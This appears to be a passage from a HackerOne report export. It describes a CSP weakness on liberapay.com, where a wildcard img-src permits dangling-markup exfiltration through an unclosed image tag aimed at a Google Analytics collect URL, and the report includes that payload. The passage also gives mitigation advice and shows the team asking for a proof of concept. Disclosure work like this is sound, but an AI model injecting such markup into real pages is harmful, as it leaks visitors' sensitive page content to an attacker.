The following is found in the current CSP Header config.\n\n```img-src * blob: data:```\n\n### Description:\nIf the site is vulnerable to HTML Injection its possible to use sources like www.google-analytics.com and inject a malicious html like the below\n\n```html\n\u003cimg src='https://www.google-analytics.com/collect?v=1\u0026tid=UA-55300588-1\u0026cid=3121525717\u0026t=event\u0026ec=email\u0026el=2111515817\u0026cs=newsletter\u0026cm=email\u0026cn=062413\u0026cm1=1\u0026ea=\n```\nIf you notice the injected img src attribute i dint close the tag, so eventually a tag with an unclosed quote will capture all output up to the next matching quote. This could include security sensitive content on pages. If a victim opens any such injected page, his information from the html response will be send to attackers google-analytics account as a get request due to the injected \u003cimg src\u003e tag. Attacker can login into his analytics account and review all log event actions and he will have the html responses of all the victims visited.\n\n### Mitigation:\nIf you feel that the site doesn't need to load images from google-analytics, remove the google-analytics from the img-src attribute of the CSP. Alternatively if you feel you need it then It is recommended to remove google-analytics from the img-src attribute and use it on connect-src and use XHR based approach - (https://developers.google.com/analytics/devguides/collection/analyticsjs/sending-hits#specifying_different_transport_mechanisms)\n\n\n### References:\nGithub  https://githubengineering.com/githubs-post-csp-journey\nHackerone  https://hackerone.com/reports/199779\nDetectify (good explanation)  https://labs.detectify.com/2018/01/19/google-analytics-data-extraction\n\n## Impact\n\nThis CSP bypass vector can be used to leverage attacks like sensitive data-exfiltration , cross site script include resulting in malicious java-script execution etc.\n\nRegards,\nNthack","weakness":{"id":57,"name":"Violation of Secure Design Principles"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":1,"voters":["0x08"],"severity":{"rating":"none","author_type":"Team"},"structured_scope":{"databaseId":8926,"asset_type":"URL","asset_identifier":"*.liberapay.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2830222,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Would it be possible to provide us with a proof of concept on liberapay.com that demonstrates HTML injection which abuses this potential issue?
